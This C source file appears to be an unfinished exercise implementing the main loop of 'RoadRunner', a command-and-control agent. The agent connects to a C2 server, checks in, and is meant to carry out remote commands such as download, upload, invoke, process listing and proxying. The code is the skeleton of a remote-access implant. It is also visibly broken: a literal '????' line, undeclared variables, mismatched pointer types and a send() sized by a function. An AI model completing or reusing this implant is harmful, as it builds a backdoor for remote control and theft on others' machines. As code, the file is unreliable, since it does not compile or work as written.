/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */
// include what we need for the functionality 
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>


// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);

/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    int agent_fd = 0;
    Response *response = NULL;
    // call our hello world function
    say_hello();

    // Agent logic
        // connect
    agent_fd = connect_to_server();
        // Send checkin
    response = checkin_command();
    send_response(agent_fd, response);
	// begin main execution loop
        	// receive_command (see Networking section below)
        	// perform_command
        	// send_response
		// repeat until shutdown command is received

    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    
    // perform an "if else" tree checking the command against all known command strings
    // receiving a valid command should result in calling the appropriate command function
    // if the shutdown command is received, an appropriate response should be returned to 
    // the server, then the client should exit

    /* Check if recieved command parameter are valid
    char* cmd;
    uint32_t cmd_len;
    char* args;
    uint32_t  args_len;

    is the total length of the message an unsigned int32?
    is cmd_len an unsigned int32?
    is the length of the args string an unsigned int32?  
    
    cmd->cmd_len
    Input validation for pointers, do I have a Null pointer?
        NULL != cmd, null != rsp_out

    */

    RR_DEBUG_PRINT("received: shutdown command\n")
    RR_DEBUG_PRINT("received: sleep command\n")
    RR_DEBUG_PRINT("received: download command\n")
    RR_DEBUG_PRINT("received: upload command\n")
    RR_DEBUG_PRINT("received: hostname command\n")
    RR_DEBUG_PRINT("received: process list command\n")
    RR_DEBUG_PRINT("received: netstat command\n")
    RR_DEBUG_PRINT("received: invoke command\n")
    RR_DEBUG_PRINT("received: proxy command\n")

    return 1;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server. 
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    // Serialize Response struct into byte stream (see commands.c in the command_io directory)
    // Send response byte stream to server
    char **serialized_response = NULL;
    serialized_response = rsp;

    if ((serialize_response(rsp, serialized_response)) < 0){
        printf("Transmission error\n");
        return false;
    }

    if(send(sock_fd, serialized_response, sizeof(serialize_response), 0) < 0){
        printf("Error: %s\n", strerror(errno));
    }

    return true;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    // Read from socket
    read(sock_fd, read_to_buffer, size_to_read);
    // convert from network to host byte order
    host_message = ntohl(read_to_buffer);
    // Validate message
    ????
    // deserialize the command received from the server and populate a Command struct
    deserialize_command(host_message);

    return cmd;
}


/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    int sock_fd = 0;
    struct sockaddr_in server;

    //Create a socket & error check
    if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        printf("Socket creation failed....\n");
        exit(0);
    }
    else
        printf("Socket successfully created...\n");

    //Set the server address
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    printf("Server address set...\n");

    //Create the connection to the server
    if (connect(sock_fd, &server, sizeof(server)) < 0){
        printf("Server connection error: %s\n", strerror(errno));
        exit(0);
    }
    else
        printf("Connection made...\n");
    return sock_fd;
}
